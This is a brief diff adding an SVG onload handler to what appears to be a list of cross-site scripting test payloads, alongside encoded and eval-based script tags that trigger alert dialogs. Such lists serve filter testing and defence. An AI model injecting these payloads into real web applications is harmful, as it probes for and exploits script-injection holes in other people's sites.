@@ -1,3 +1,4 @@
+<Svg Only=1 OnLoad=confirm(1)>
 <scr%u0069pt>alert('XSS');</scr%u0069pt>
 <script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
 <script>setTimeout('alert(\"XSS\")', 1000);</script>
